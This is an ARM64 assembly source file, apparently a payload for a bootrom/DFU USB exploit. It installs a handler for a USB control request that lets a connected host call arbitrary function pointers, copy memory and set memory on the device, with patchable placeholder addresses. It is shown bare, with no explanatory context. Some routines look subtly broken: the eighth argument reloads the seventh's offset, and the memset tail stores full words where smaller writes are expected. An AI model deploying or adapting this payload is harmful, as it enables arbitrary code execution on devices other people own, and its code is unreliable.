.text

.pool
.set USB_CORE_DO_IO, 0xBAD00006
.set LOAD_ADDRESS,   0xBAD00001
.set EXEC_MAGIC,     0xBAD00002
.set MEMC_MAGIC,     0xBAD00004
.set MEMS_MAGIC,     0xBAD00005
.set DONE_MAGIC,     0xBAD00003

.global _main
_main:
jump_back:
  BRK  #1
  BRK  #1

  LDRH W2, [X0]
  CMP  W2, #0x2A1
  BNE  jump_back

  STP  X29, X30, [SP,#-0x10]!
  MOV  X29, SP
  STP  X20, X19, [SP,#-0x10]!

  MOV  X19, X0
  LDR  X20, =LOAD_ADDRESS

  MOV  W1, #0xFFFF
  LDRH W2, [X19,#2]
  CMP  W1, W2
  BNE  request_done

  LDR  X0, [X20]                               ; X0 = LOAD_ADDRESS[0]

  LDR  X1, =EXEC_MAGIC
  CMP  X0, X1
  BNE  not_exec                                ; if (X0 != EXEC_MAGIC) goto not_exec

  STR  XZR, [X20]                              ; LOAD_ADDRESS[0] = 0

  LDR  X0, [X20, #0x10]                        ; X0 = LOAD_ADDRESS[2]      /* arg1 */
  LDR  X1, [X20, #0x18]                        ; X1 = LOAD_ADDRESS[3]      /* arg2 */
  LDR  X2, [X20, #0x20]                        ; X2 = LOAD_ADDRESS[4]      /* arg3 */
  LDR  X3, [X20, #0x28]                        ; X3 = LOAD_ADDRESS[5]      /* arg4 */
  LDR  X4, [X20, #0x30]                        ; X4 = LOAD_ADDRESS[6]      /* arg5 */
  LDR  X5, [X20, #0x38]                        ; X5 = LOAD_ADDRESS[7]      /* arg6 */
  LDR  X6, [X20, #0x40]                        ; X6 = LOAD_ADDRESS[8]      /* arg7 */
  LDR  X7, [X20, #0x40]                        ; X7 = LOAD_ADDRESS[9]      /* arg8 */
  LDR  X8, [X20, #0x8]
  BLR  X8                                      ; X0 = LOAD_ADDRESS[1](X0, X1, X2, X3, X4, X5, X6, X7)

  LDR  X8, =DONE_MAGIC
  STP  X8, X0, [X20]                           ; LOAD_ADDRESS[0,1] = DONE_MAGIC, X0
  B    request_done

not_exec:
  LDR  X1, =MEMC_MAGIC
  CMP  X0, X1
  BNE  not_memc

  STR  XZR, [X20]

  LDP  X0, X1, [X20, #0x10]
  LDR  X2, [X20, #0x20]
  BL   memcpy

  LDR  X8, =DONE_MAGIC
  STR  X8, [X20]
  B    request_done

not_memc:
  LDR  X1, =MEMS_MAGIC
  CMP  X0, X1
  BNE  request_done

  STR  XZR, [X20]
  
  LDP  X0, X1, [X20, #0x10]
  LDR  X2, [X20, #0x20]
  BL   memset

  LDR  X8, =DONE_MAGIC
  STR  X8, [X20]
  B    request_done

request_done:
  MOV  W0, #0x80
  MOV  X1, X20
  LDRH W2, [X19,#6]
  MOV  X3, #0
  LDR  X4, =USB_CORE_DO_IO
  BLR  X4

  MOV  W0, #0
  LDP  X20, X19, [SP],#0x10
  LDP  X29, X30, [SP],#0x10
  RET

memset:
  MOV  X3, #0x101010101010101
  AND  X1, X1, #0xFF
  MUL  X1, X1, X3
  MOV  X3, X0

memset_8:
  CMP  X2, #8
  B.CC memset_4

  STR  X1, [X0]
  ADD  X0, X0, #8
  SUB  X2, X2, #8
  B    memset_8

memset_4:
  CMP  X2, #4
  B.CC memset_2

  STR  W1, [X0]
  ADD  X0, X0, #4
  SUB  X2, X2, #4

memset_2:
  CMP  X2, #2
  B.CC memset_1

  STR  W1, [X0]
  ADD  X0, X0, #2
  SUB  X2, X2, #2

memset_1:
  CBZ  X2, memset_done

  STR  W1, [X0]
  ADD  X0, X0, #1
  SUB  X2, X2, #1

memset_done:
  MOV  X0, X3
  RET 

memcpy:
  MOV  X4, X0

memcpy_8:
  CMP  X2, #8
  B.CC memcpy_4

  LDR  X3, [X1]
  STR  X3, [X0]
  ADD  X0, X0, #8
  ADD  X1, X1, #8
  SUB  X2, X2, #8
  B    memcpy_8

memcpy_4:
  CMP  X2, #4
  B.CC memcpy_2

  LDR  W3, [X1]
  STR  W3, [X0]
  ADD  X0, X0, #4
  ADD  X1, X1, #4
  SUB  X2, X2, #4

memcpy_2:
  CMP  X2, #2
  B.CC memcpy_1
  
  LDRH W3, [X1]
  STRH W3, [X0]
  ADD  X0, X0, #2
  ADD  X1, X1, #2
  SUB  X2, X2, #2

memcpy_1:
  CBZ  X2, memcpy_done

  LDRB W3, [X1]
  STRB W3, [X0]
  ADD  X0, X0, #1
  ADD  X1, X1, #1
  SUB  X2, X2, #1

memcpy_done:
  MOV  X0, X4
  RET
